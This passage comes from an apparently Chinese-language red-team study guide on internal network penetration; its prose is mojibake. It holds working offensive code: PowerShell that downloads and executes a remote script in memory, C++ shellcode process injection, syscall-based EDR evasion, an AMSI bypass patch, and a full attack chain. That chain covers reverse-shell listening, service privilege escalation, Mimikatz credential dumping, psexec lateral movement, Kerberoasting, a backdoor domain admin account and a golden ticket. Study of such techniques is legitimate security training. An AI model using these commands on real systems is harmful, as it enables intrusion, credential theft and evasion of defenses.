    $info['Gateway'] = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop

    # æ€è½¯æ£€æµ‹
    $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $info['AntiVirus'] = $av.displayName

    # å½“å‰æƒé™
    $info['IsAdmin'] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    return $info
}

# å¯¼å‡ºç»“æœ
Get-SystemInfo | ConvertTo-Json | Out-File info.json
</code></pre>
<h4 id="å†…å­˜æ‰§è¡Œè„šæœ¬"><a class="header" href="#å†…å­˜æ‰§è¡Œè„šæœ¬">å†…å­˜æ‰§è¡Œè„šæœ¬</a></h4>
<pre><code class="language-powershell"># Invoke-Expressionä»å†…å­˜æ‰§è¡Œ
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')

# Bypassæ‰§è¡Œç­–ç•¥
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"

# ç¼–ç æ‰§è¡Œ
$command = 'Write-Host "Hello"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand
</code></pre>
<h3 id="83-ccå·¥å…·å¼€å‘"><a class="header" href="#83-ccå·¥å…·å¼€å‘">8.3 C/C++å·¥å…·å¼€å‘</a></h3>
<h4 id="è¿›ç¨‹æ³¨å…¥"><a class="header" href="#è¿›ç¨‹æ³¨å…¥">è¿›ç¨‹æ³¨å…¥</a></h4>
<pre><code class="language-cpp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

// Shellcode (calc.exe)
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);

    // æ‰“å¼€ç›®æ ‡è¿›ç¨‹
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // å†™å…¥shellcode
    WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL);

    // åˆ›å»ºè¿œç¨‹çº¿ç¨‹
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pRemoteCode,
                                       NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
</code></pre>
<hr />
<h2 id="9-é˜²å¾¡å¯¹æŠ—æŠ€æœ¯"><a class="header" href="#9-é˜²å¾¡å¯¹æŠ—æŠ€æœ¯">9. é˜²å¾¡å¯¹æŠ—æŠ€æœ¯</a></h2>
<h3 id="91-edrç»•è¿‡"><a class="header" href="#91-edrç»•è¿‡">9.1 EDRç»•è¿‡</a></h3>
<h4 id="è¿›ç¨‹æ³¨å…¥æŠ€æœ¯"><a class="header" href="#è¿›ç¨‹æ³¨å…¥æŠ€æœ¯">è¿›ç¨‹æ³¨å…¥æŠ€æœ¯</a></h4>
<p><strong>ç»å…¸æ³¨å…¥</strong>:</p>
<pre><code class="language-cpp">// 1. CreateRemoteThreadæ³¨å…¥
// 2. APCæ³¨å…¥
// 3. Process Hollowing
// 4. Reflective DLLæ³¨å…¥
</code></pre>
<p><strong>è¿›ç¨‹è¿ç§»ï¼ˆMeterpreterï¼‰</strong>:</p>
<pre><code class="language-bash">meterpreter &gt; ps
meterpreter &gt; migrate 1234  # è¿ç§»åˆ°åˆæ³•è¿›ç¨‹
</code></pre>
<h4 id="å†…å­˜åŠ è½½"><a class="header" href="#å†…å­˜åŠ è½½">å†…å­˜åŠ è½½</a></h4>
<p><strong>PowerShell Reflection</strong>:</p>
<pre><code class="language-powershell"># ä»å†…å­˜åŠ è½½.NETç¨‹åºé›†
$bytes = [System.IO.File]::ReadAllBytes("C:\assembly.dll")
[System.Reflection.Assembly]::Load($bytes)
[Namespace.Class]::Method()

# åŠ è½½PEæ–‡ä»¶åˆ°å†…å­˜
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234
</code></pre>
<p><strong>C# Assembly Execute</strong>:</p>
<pre><code class="language-csharp">byte[] assemblyBytes = File.ReadAllBytes("payload.dll");
Assembly assembly = Assembly.Load(assemblyBytes);
MethodInfo method = assembly.EntryPoint;
method.Invoke(null, null);
</code></pre>
<h4 id="api-hookç»•è¿‡"><a class="header" href="#api-hookç»•è¿‡">API Hookç»•è¿‡</a></h4>
<pre><code class="language-cpp">// ç›´æ¥ç³»ç»Ÿè°ƒç”¨
// ç»•è¿‡ç”¨æˆ·æ€Hook
NTSTATUS NtCreateFile(...) {
    // ç›´æ¥è°ƒç”¨syscall
    __asm {
        mov r10, rcx
        mov eax, 0x55  // NtCreateFile syscall number
        syscall
        ret
    }
}
</code></pre>
<h3 id="92-avedræ£€æµ‹è§„é¿"><a class="header" href="#92-avedræ£€æµ‹è§„é¿">9.2 AV/EDRæ£€æµ‹è§„é¿</a></h3>
<h4 id="æ··æ·†æŠ€æœ¯"><a class="header" href="#æ··æ·†æŠ€æœ¯">æ··æ·†æŠ€æœ¯</a></h4>
<pre><code class="language-powershell"># å­—ç¬¦ä¸²æ··æ·†
$a = 'I'+'EX'
&amp; $a (New-Object Net.WebClient).DownloadString('http://...')

# Base64ç¼–ç 
$command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
powershell.exe -enc $command

# XORåŠ å¯†
$key = 0x42
$encrypted = $shellcode | ForEach-Object { $_ -bxor $key }
</code></pre>
<h4 id="amsiç»•è¿‡"><a class="header" href="#amsiç»•è¿‡">AMSIç»•è¿‡</a></h4>
<pre><code class="language-powershell"># AMSIå†…å­˜Patch
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# ç®€åŒ–ç‰ˆ
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<hr />
<h2 id="10-å®æˆ˜æ”»å‡»é“¾æ¡ˆä¾‹"><a class="header" href="#10-å®æˆ˜æ”»å‡»é“¾æ¡ˆä¾‹">10. å®æˆ˜æ”»å‡»é“¾æ¡ˆä¾‹</a></h2>
<h3 id="101-å®Œæ•´æ”»å‡»é“¾ç¤ºä¾‹"><a class="header" href="#101-å®Œæ•´æ”»å‡»é“¾ç¤ºä¾‹">10.1 å®Œæ•´æ”»å‡»é“¾ç¤ºä¾‹</a></h3>
<p><strong>åœºæ™¯</strong>: ä»å¤–ç½‘WebæœåŠ¡å™¨æ¸—é€åˆ°å†…ç½‘åŸŸæ§</p>
<p><strong>é˜¶æ®µ1: å¤–ç½‘çªç ´</strong></p>
<pre><code class="language-bash"># 1. ä¿¡æ¯æ”¶é›†
nmap -sV target.com
whatweb target.com
dirsearch -u http://target.com

# 2. æ¼æ´åˆ©ç”¨ï¼ˆå‡è®¾å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰
# ä¸Šä¼ Webshell

# 3. è·å¾—åˆå§‹Shell
nc -lvnp 4444
</code></pre>
<p><strong>é˜¶æ®µ2: å†…ç½‘ä¿¡æ¯æ”¶é›†</strong></p>
<pre><code class="language-powershell"># è·å–ç³»ç»Ÿä¿¡æ¯
systeminfo
ipconfig /all
net user
net localgroup administrators

# æŸ¥çœ‹åŸŸç¯å¢ƒ
net view /domain
net group "Domain Controllers" /domain
nltest /dclist:

# ç«¯å£æ‰«æå†…ç½‘
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="
</code></pre>
<p><strong>é˜¶æ®µ3: æƒé™æå‡</strong></p>
<pre><code class="language-powershell"># ä½¿ç”¨PowerUpæ£€æŸ¥ææƒç‚¹
Invoke-AllChecks

# åˆ©ç”¨æœåŠ¡æƒé™ææƒ
sc config vulnerable_service binPath= "cmd.exe /c net localgroup administrators user /add"
sc stop vulnerable_service
sc start vulnerable_service
</code></pre>
<p><strong>é˜¶æ®µ4: å‡­è¯è·å–</strong></p>
<pre><code class="language-powershell"># Mimikatzæå–å¯†ç 
privilege::debug
sekurlsa::logonpasswords

# æå–åˆ°åŸŸç”¨æˆ·å‡­è¯
# domain\user : Password123!
</code></pre>
<p><strong>é˜¶æ®µ5: æ¨ªå‘ç§»åŠ¨</strong></p>
<pre><code class="language-bash"># ä½¿ç”¨è·å–çš„å‡­è¯æ¨ªå‘åˆ°å…¶ä»–ä¸»æœº
psexec.py domain/user:Password123!@192.168.1.20

# ç»§ç»­æ”¶é›†å‡­è¯
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
</code></pre>
<p><strong>é˜¶æ®µ6: åŸŸæ§åˆ¶å™¨æ”»å‡»</strong></p>
<pre><code class="language-bash"># Kerberoastingæ”»å‡»
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain/user:password

# è·å–åˆ°åŸŸç®¡ç†å‘˜æƒé™å
psexec.py domain/admin:password@192.168.1.10
</code></pre>
<p><strong>é˜¶æ®µ7: æŒä¹…åŒ–</strong></p>
<pre><code class="language-powershell"># åˆ›å»ºåŸŸç”¨æˆ·
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain

# é»„é‡‘ç¥¨æ®
mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt"
</code></pre>
<h3 id="102-çº¢è“å¯¹æŠ—åœºæ™¯"><a class="header" href="#102-çº¢è“å¯¹æŠ—åœºæ™¯">10.2 çº¢è“å¯¹æŠ—åœºæ™¯</a></h3>
<h4 id="çº¢é˜Ÿæ”»å‡»ç­–ç•¥"><a class="header" href="#çº¢é˜Ÿæ”»å‡»ç­–ç•¥">çº¢é˜Ÿæ”»å‡»ç­–ç•¥</a></h4>
<p><strong>åˆå§‹è®¿é—®</strong>:</p>
<ul>
<li>é’“é±¼é‚®ä»¶ + Officeå®</li>
<li>ä¾›åº”é“¾æ”»å‡»</li>
<li>VPNå¼±å¯†ç çˆ†ç ´</li>
<li>0dayæ¼æ´åˆ©ç”¨</li>
</ul>
<p><strong>æŒä¹…åŒ–ç­–ç•¥</strong>:</p>
<ul>
<li>å¤šé‡æŒä¹…åŒ–ç‚¹</li>
<li>éšè”½é€šä¿¡é€šé“</li>
<li>å¤‡ç”¨C2æœåŠ¡å™¨</li>
<li>äº‘ç«¯èµ„æºåˆ©ç”¨</li>
</ul>
<p><strong>æ¨ªå‘ç§»åŠ¨è·¯å¾„</strong>:</p>
<pre><code>WebæœåŠ¡å™¨ -&gt; è·³æ¿æœº -&gt; å†…ç½‘PC -&gt; æœåŠ¡å™¨ -&gt; åŸŸæ§
</code></pre>
<h4 id="è“é˜Ÿé˜²å¾¡ç­–ç•¥"><a class="header" href="#è“é˜Ÿé˜²å¾¡ç­–ç•¥">è“é˜Ÿé˜²å¾¡ç­–ç•¥</a></h4>
<p><strong>æ£€æµ‹ç‚¹éƒ¨ç½²</strong>:</p>
<ul>
<li>ç½‘ç»œæµé‡åˆ†æï¼ˆIDS/IPSï¼‰</li>
<li>ç«¯ç‚¹æ£€æµ‹å“åº”ï¼ˆEDRï¼‰</li>
<li>æ—¥å¿—é›†ä¸­åˆ†æï¼ˆSIEMï¼‰</li>
<li>èœœç½ç³»ç»Ÿéƒ¨ç½²</li>
</ul>
<p><strong>å“åº”æªæ–½</strong>:</p>
<pre><code class="language-bash"># 1. éš”ç¦»å—æ„ŸæŸ“ä¸»æœº
# 2. é˜»æ–­C2é€šä¿¡
# 3. æ”¶é›†å–è¯æ•°æ®
# 4. åˆ†ææ”»å‡»æ‰‹æ³•
# 5. ä¿®å¤æ¼æ´
# 6. æ¢å¤ä¸šåŠ¡
</code></pre>
<hr />
<h2 id="11-å­¦ä¹ éªŒè¯æ ‡å‡†"><a class="header" href="#11-å­¦ä¹ éªŒè¯æ ‡å‡†">11. å­¦ä¹ éªŒè¯æ ‡å‡†</a></h2>
<h3 id="-é˜¶æ®µä¸€åŸºç¡€å»ºç«‹1-2ä¸ªæœˆ"><a class="header" href="#-é˜¶æ®µä¸€åŸºç¡€å»ºç«‹1-2ä¸ªæœˆ">âœ… é˜¶æ®µä¸€ï¼šåŸºç¡€å»ºç«‹ï¼ˆ1-2ä¸ªæœˆï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
ç†Ÿæ‚‰å†…ç½‘æ‹“æ‰‘ç»“æ„å’Œå¸¸è§ç½‘ç»œæ¶æ„</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡Nmapã€Masscanç­‰æ‰«æå·¥å…·</li>
<li><input disabled="" type="checkbox"/>
ç†è§£Windowså’ŒLinuxæƒé™æ¨¡å‹</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿæ­å»ºåŸŸç¯å¢ƒæµ‹è¯•å®éªŒå®¤</li>
<li><input disabled="" type="checkbox"/>
å®ŒæˆOSCP/HTB 10å°é¶æœº</li>
</ul>
<h3 id="-é˜¶æ®µäºŒæŠ€èƒ½æå‡3-4ä¸ªæœˆ"><a class="header" href="#-é˜¶æ®µäºŒæŠ€èƒ½æå‡3-4ä¸ªæœˆ">âœ… é˜¶æ®µäºŒï¼šæŠ€èƒ½æå‡ï¼ˆ3-4ä¸ªæœˆï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
æŒæ¡5ç§ä»¥ä¸Šæ¨ªå‘ç§»åŠ¨æŠ€æœ¯</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè¿›è¡ŒKerberosæ”»å‡»ï¼ˆKerberoastingã€Golden Ticketï¼‰</li>
<li><input disabled="" type="checkbox"/>
ç†Ÿç»ƒä½¿ç”¨Mimikatzã€BloodHoundç­‰å·¥å…·</li>
<li><input disabled="" type="checkbox"/>
ç¼–å†™è‡ªåŠ¨åŒ–æ¸—é€è„šæœ¬</li>
<li><input disabled="" type="checkbox"/>
å®ŒæˆåŸŸæ¸—é€CTFæŒ‘æˆ˜</li>
</ul>
<h3 id="-é˜¶æ®µä¸‰å®æˆ˜åº”ç”¨5-6ä¸ªæœˆ"><a class="header" href="#-é˜¶æ®µä¸‰å®æˆ˜åº”ç”¨5-6ä¸ªæœˆ">âœ… é˜¶æ®µä¸‰ï¼šå®æˆ˜åº”ç”¨ï¼ˆ5-6ä¸ªæœˆï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
ç‹¬ç«‹å®Œæˆå®Œæ•´å†…ç½‘æ¸—é€é¡¹ç›®</li>
<li><input disabled="" type="checkbox"/>
ç»•è¿‡EDR/AVé˜²æŠ¤</li>
<li><input disabled="" type="checkbox"/>
å¼€å‘è‡ªå®šä¹‰æ¸—é€å·¥å…·</li>
<li><input disabled="" type="checkbox"/>
å‚ä¸çº¢è“å¯¹æŠ—æ¼”ç»ƒ</li>
<li><input disabled="" type="checkbox"/>
é€šè¿‡OSCP/OSEPè®¤è¯</li>
</ul>
<hr />
<h2 id="12-å®æˆ˜ç¯å¢ƒæ¨è"><a class="header" href="#12-å®æˆ˜ç¯å¢ƒæ¨è">12. å®æˆ˜ç¯å¢ƒæ¨è</a></h2>
<h3 id="åœ¨çº¿é¶åœº"><a class="header" href="#åœ¨çº¿é¶åœº">åœ¨çº¿é¶åœº</a></h3>
<ul>
<li><strong>HackTheBox</strong>: Active Directoryé¶æœº</li>
<li><strong>VulnHub</strong>: å†…ç½‘æ¸—é€ç³»åˆ—é¶æœº</li>
<li><strong>GOAD</strong>: æ¸¸æˆåŒ–ADç¯å¢ƒ</li>
<li><strong>PentesterAcademy</strong>: çº¢é˜Ÿå®éªŒå®¤</li>
</ul>
<h3 id="æœ¬åœ°æ­å»º"><a class="header" href="#æœ¬åœ°æ­å»º">æœ¬åœ°æ­å»º</a></h3>
<p><strong>åŸŸç¯å¢ƒæ­å»º</strong>:</p>
<pre><code class="language-powershell"># Windows Server 2019 (åŸŸæ§)
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local"

# Windows 10 (åŸŸæˆå‘˜)
Add-Computer -DomainName "lab.local" -Credential (Get-Credential)
Restart-Computer

# åˆ›å»ºæµ‹è¯•ç”¨æˆ·
New-ADUser -Name "testuser" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
</code></pre>
<p><strong>é¶åœºæ¨èé…ç½®</strong>:</p>
<pre><code>1å°åŸŸæ§ (Windows Server 2019)
2å°åŸŸæˆå‘˜æœº (Windows 10)
1å°WebæœåŠ¡å™¨ (Ubuntu + DVWA)
1å°æ•°æ®åº“æœåŠ¡å™¨ (Windows + MSSQL)
1å°Kaliæ”»å‡»æœº
</code></pre>
<hr />
<h2 id="13-æ‰©å±•å­¦ä¹ èµ„æº"><a class="header" href="#13-æ‰©å±•å­¦ä¹ èµ„æº">13. æ‰©å±•å­¦ä¹ èµ„æº</a></h2>
<h3 id="-æ¨èä¹¦ç±"><a class="header" href="#-æ¨èä¹¦ç±">ğŸ“š æ¨èä¹¦ç±</a></h3>
<ol>
<li><strong>ã€Šå†…ç½‘å®‰å…¨æ”»é˜²ã€‹</strong> - ç³»ç»ŸåŒ–å†…ç½‘æ¸—é€çŸ¥è¯†</li>
<li><strong>ã€Šæ¸—é€æµ‹è¯•å®è·µæŒ‡å—ï¼ˆç¬¬3ç‰ˆï¼‰ã€‹</strong> - ç»å…¸å¿…è¯»</li>
<li><strong>ã€ŠActive Directoryå®‰å…¨æŒ‡å—ã€‹</strong> - ADå®‰å…¨æ·±åº¦è§£æ</li>
<li><strong>ã€ŠPowerShellæ”»é˜²å®æˆ˜ã€‹</strong> - PowerShellæ¸—é€æŠ€å·§</li>
</ol>
<h3 id="-åœ¨çº¿è¯¾ç¨‹"><a class="header" href="#-åœ¨çº¿è¯¾ç¨‹">ğŸ“ åœ¨çº¿è¯¾ç¨‹</a></h3>
<ul>
<li>SANS SEC560: Network Penetration Testing</li>
<li>Offensive Security: PEN-300 (OSEP)</li>
<li>Pentester Academy: Red Team Lab</li>
<li>eLearnSecurity: eCPTXv2</li>
</ul>
<h3 id="-å¿…å¤‡å·¥å…·é›†"><a class="header" href="#-å¿…å¤‡å·¥å…·é›†">ğŸ”§ å¿…å¤‡å·¥å…·é›†</a></h3>
<p><strong>ä¿¡æ¯æ”¶é›†</strong>:</p>
<pre><code class="language-bash">nmap, masscan, crackmapexec, bloodhound,
sharphound, adrecon, powerView
</code></pre>
<p><strong>æ¼æ´åˆ©ç”¨</strong>:</p>
<pre><code class="language-bash">metasploit, empire, covenant, sliver,
impacket, crackmapexec
</code></pre>
<p><strong>æƒé™æå‡</strong>:</p>
<pre><code class="language-bash">winpeas, linpeas, powerup, powerless,
beroot, linux-exploit-suggester
</code></pre>
<p><strong>å‡­è¯è·å–</strong>:</p>
<pre><code class="language-bash">mimikatz, lazagne, pypykatz, secretsdump,
rubeus, kerberoast
</code></pre>
<p><strong>æ¨ªå‘ç§»åŠ¨</strong>:</p>
<pre><code class="language-bash">psexec, wmiexec, smbexec, evil-winrm,
chisel, frp, proxychains
</code></pre>
<h3 id="-å®‰å…¨èµ„è®¯ä¸ç¤¾åŒº"><a class="header" href="#-å®‰å…¨èµ„è®¯ä¸ç¤¾åŒº">ğŸ“° å®‰å…¨èµ„è®¯ä¸ç¤¾åŒº</a></h3>
<ul>
<li><strong>Pentester Blog</strong>: å†…ç½‘æ¸—é€æŠ€å·§åˆ†äº«</li>
<li><strong>SpecterOps</strong>: çº¢é˜Ÿæˆ˜æœ¯ç ”ç©¶</li>
<li><strong>HarmJ0y Blog</strong>: ADå®‰å…¨ç ”ç©¶</li>
<li><strong>Red Team Notes</strong>: çº¢é˜Ÿç¬”è®°</li>
<li><strong>MITRE ATT&amp;CK</strong>: æ”»å‡»æˆ˜æœ¯çŸ¥è¯†åº“</li>
</ul>
<hr />
<h2 id="14-èŒä¸šå‘å±•è·¯å¾„"><a class="header" href="#14-èŒä¸šå‘å±•è·¯å¾„">14. èŒä¸šå‘å±•è·¯å¾„</a></h2>
<h3 id="åˆçº§æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ0-2å¹´"><a class="header" href="#åˆçº§æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ0-2å¹´">åˆçº§æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆï¼ˆ0-2å¹´ï¼‰</a></h3>
<ul>
<li>æŒæ¡åŸºç¡€å†…ç½‘æ¸—é€æŠ€æœ¯</li>
<li>ç†Ÿç»ƒä½¿ç”¨ä¸»æµæ¸—é€å·¥å…·</li>
<li>èƒ½å¤Ÿå®Œæˆæ ‡å‡†åŒ–æ¸—é€æµ‹è¯•</li>
<li>ç¼–å†™åˆæ ¼çš„æ¸—é€æµ‹è¯•æŠ¥å‘Š</li>
</ul>
<h3 id="ä¸­çº§çº¢é˜Ÿå·¥ç¨‹å¸ˆ2-5å¹´"><a class="header" href="#ä¸­çº§çº¢é˜Ÿå·¥ç¨‹å¸ˆ2-5å¹´">ä¸­çº§çº¢é˜Ÿå·¥ç¨‹å¸ˆï¼ˆ2-5å¹´ï¼‰</a></h3>
<ul>
<li>ç‹¬ç«‹å®Œæˆå¤æ‚å†…ç½‘æ¸—é€é¡¹ç›®</li>
<li>èƒ½å¤Ÿç»•è¿‡ä¸»æµå®‰å…¨é˜²æŠ¤</li>
<li>å¼€å‘è‡ªå®šä¹‰æ”»å‡»å·¥å…·</li>
<li>å‚ä¸APTæ”»å‡»æ¨¡æ‹Ÿ</li>
</ul>
<h3 id="é«˜çº§çº¢é˜Ÿä¸“å®¶5å¹´ä»¥ä¸Š"><a class="header" href="#é«˜çº§çº¢é˜Ÿä¸“å®¶5å¹´ä»¥ä¸Š">é«˜çº§çº¢é˜Ÿä¸“å®¶ï¼ˆ5å¹´ä»¥ä¸Šï¼‰</a></h3>
<ul>
<li>è®¾è®¡å¤æ‚çº¢é˜Ÿè¡ŒåŠ¨æ–¹æ¡ˆ</li>
<li>ç ”ç©¶0dayæ¼æ´å’Œé«˜çº§åˆ©ç”¨æŠ€æœ¯</li>
<li>å¸¦é¢†å›¢é˜Ÿå®Œæˆå¤§å‹æ¼”ç»ƒ</li>
<li>åˆ¶å®šä¼ä¸šå®‰å…¨é˜²å¾¡ç­–ç•¥</li>
</ul>
<hr />
<h2 id="15-60å¤©ç³»ç»Ÿå­¦ä¹ è®¡åˆ’"><a class="header" href="#15-60å¤©ç³»ç»Ÿå­¦ä¹ è®¡åˆ’">15. 60å¤©ç³»ç»Ÿå­¦ä¹ è®¡åˆ’</a></h2>
<h3 id="ç¬¬1-2å‘¨-åŸºç¡€å»ºè®¾"><a class="header" href="#ç¬¬1-2å‘¨-åŸºç¡€å»ºè®¾">ç¬¬1-2å‘¨: åŸºç¡€å»ºè®¾</a></h3>
<ul>
<li>æ­å»ºå®éªŒç¯å¢ƒï¼ˆåŸŸç¯å¢ƒ + é¶æœºï¼‰</li>
<li>å­¦ä¹ ç½‘ç»œåè®®å’Œæ“ä½œç³»ç»ŸåŸç†</li>
<li>ç†Ÿæ‚‰Nmapã€MetasploitåŸºç¡€æ“ä½œ</li>
<li>å®ŒæˆHackTheBox 3å°ç®€å•é¶æœº</li>
</ul>
<h3 id="ç¬¬3-4å‘¨-ä¿¡æ¯æ”¶é›†"><a class="header" href="#ç¬¬3-4å‘¨-ä¿¡æ¯æ”¶é›†">ç¬¬3-4å‘¨: ä¿¡æ¯æ”¶é›†</a></h3>
<ul>
<li>ä¸»æœºå‘ç°å’Œç«¯å£æ‰«ææŠ€æœ¯</li>
<li>åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†æ–¹æ³•</li>
<li>BloodHoundä½¿ç”¨å’Œè·¯å¾„åˆ†æ</li>
<li>å®ŒæˆåŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†å®éªŒ</li>
</ul>
<h3 id="ç¬¬5-6å‘¨-æ¼æ´åˆ©ç”¨"><a class="header" href="#ç¬¬5-6å‘¨-æ¼æ´åˆ©ç”¨">ç¬¬5-6å‘¨: æ¼æ´åˆ©ç”¨</a></h3>
<ul>
<li>å¸¸è§å†…ç½‘æœåŠ¡æ¼æ´åˆ©ç”¨</li>
<li>Webåº”ç”¨æ¼æ´åˆ°å†…ç½‘çªç ´</li>
<li>Metasploitæ¨¡å—å¼€å‘</li>
<li>å®Œæˆ5ä¸ªæ¼æ´åˆ©ç”¨ç»ƒä¹ </li>
</ul>
<h3 id="ç¬¬7-8å‘¨-æƒé™æå‡"><a class="header" href="#ç¬¬7-8å‘¨-æƒé™æå‡">ç¬¬7-8å‘¨: æƒé™æå‡</a></h3>
<ul>
<li>Windowsæƒé™æå‡å…¨æŠ€æœ¯</li>
<li>Linuxæƒé™æå‡æ–¹æ³•</li>
<li>è‡ªåŠ¨åŒ–ææƒè„šæœ¬ä½¿ç”¨</li>
<li>å®Œæˆ10ä¸ªææƒé¶æœº</li>
</ul>
<h3 id="ç¬¬9-12å‘¨-æ¨ªå‘ç§»åŠ¨ä¸æŒä¹…åŒ–"><a class="header" href="#ç¬¬9-12å‘¨-æ¨ªå‘ç§»åŠ¨ä¸æŒä¹…åŒ–">ç¬¬9-12å‘¨: æ¨ªå‘ç§»åŠ¨ä¸æŒä¹…åŒ–</a></h3>
<ul>
<li>Pass-the-Hash/Ticketæ”»å‡»</li>
<li>Kerberosæ”»å‡»æŠ€æœ¯</li>
<li>éš§é“æŠ€æœ¯å®æˆ˜</li>
<li>æŒä¹…åŒ–æœºåˆ¶éƒ¨ç½²</li>
<li>å®Œæˆå®Œæ•´æ”»å‡»é“¾æ¼”ç»ƒ</li>
</ul>
<h3 id="ç¬¬13-14å‘¨-å¯¹æŠ—ä¸å…æ€"><a class="header" href="#ç¬¬13-14å‘¨-å¯¹æŠ—ä¸å…æ€">ç¬¬13-14å‘¨: å¯¹æŠ—ä¸å…æ€</a></h3>
<ul>
<li>AV/EDRç»•è¿‡æŠ€æœ¯</li>
<li>å†…å­˜æ‰§è¡Œå’Œè¿›ç¨‹æ³¨å…¥</li>
<li>æ··æ·†å’ŒåŠ å¯†æŠ€æœ¯</li>
<li>è‡ªå®šä¹‰å·¥å…·å¼€å‘</li>
</ul>
<h3 id="ç¬¬15-16å‘¨-ç»¼åˆå®æˆ˜"><a class="header" href="#ç¬¬15-16å‘¨-ç»¼åˆå®æˆ˜">ç¬¬15-16å‘¨: ç»¼åˆå®æˆ˜</a></h3>
<ul>
<li>å®Œæ•´çº¢é˜Ÿé¡¹ç›®æ¨¡æ‹Ÿ</li>
<li>ç¼–å†™è¯¦ç»†æ¸—é€æŠ¥å‘Š</li>
<li>æ€»ç»“ç»éªŒå’ŒçŸ¥è¯†æ¢³ç†</li>
<li>å‡†å¤‡OSCPè®¤è¯</li>
</ul>
<hr />
<h2 id="-å®‰å…¨æé†’"><a class="header" href="#-å®‰å…¨æé†’">âš ï¸ å®‰å…¨æé†’</a></h2>
<ol>
<li><strong>æ³•å¾‹ç¬¬ä¸€</strong>: æ‰€æœ‰æŠ€æœ¯ä»…ç”¨äºæˆæƒæµ‹è¯•</li>
<li><strong>ä¿å¯†ä¹‰åŠ¡</strong>: ä¸¥æ ¼ä¿æŠ¤å®¢æˆ·æ•°æ®å’Œæµ‹è¯•ç»“æœ</li>
<li><strong>æœ€å°å½±å“</strong>: é¿å…å¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆç ´å</li>
<li><strong>åŠæ—¶æ²Ÿé€š</strong>: å‘ç°é«˜å±æ¼æ´ç«‹å³æŠ¥å‘Š</li>
<li><strong>æŒç»­å­¦ä¹ </strong>: æ”»é˜²æŠ€æœ¯ä¸æ–­æ¼”è¿›ï¼Œä¿æŒå­¦ä¹ çŠ¶æ€</li>
</ol>
<hr />
<h2 id="-æ€»ç»“"><a class="header" href="#-æ€»ç»“">ğŸ“ æ€»ç»“</a></h2>
<p>å†…ç½‘æ¸—é€æ˜¯ä¿¡æ¯å®‰å…¨é¢†åŸŸçš„é«˜çº§æŠ€æœ¯æ–¹å‘ï¼Œéœ€è¦æ‰å®çš„åŸºç¡€çŸ¥è¯†å’Œå¤§é‡çš„å®è·µç»éªŒã€‚æœ¬æŒ‡å—æä¾›äº†ç³»ç»ŸåŒ–çš„å­¦ä¹ è·¯å¾„ï¼Œä½†çœŸæ­£çš„æŠ€èƒ½æå‡éœ€è¦ï¼š</p>
<ol>
<li><strong>æ·±å…¥ç†è§£</strong>: ä¸ä»…çŸ¥é“æ€ä¹ˆåšï¼Œæ›´è¦ç†è§£ä¸ºä»€ä¹ˆ</li>
<li><strong>å¤§é‡å®è·µ</strong>: ç†è®ºå¿…é¡»ç»“åˆé¶åœºå’Œå®æˆ˜æ¼”ç»ƒ</li>
<li><strong>ä¸¾ä¸€åä¸‰</strong>: ä»å•ä¸ªæŠ€æœ¯æ‰©å±•åˆ°å®Œæ•´æ”»å‡»é“¾</li>
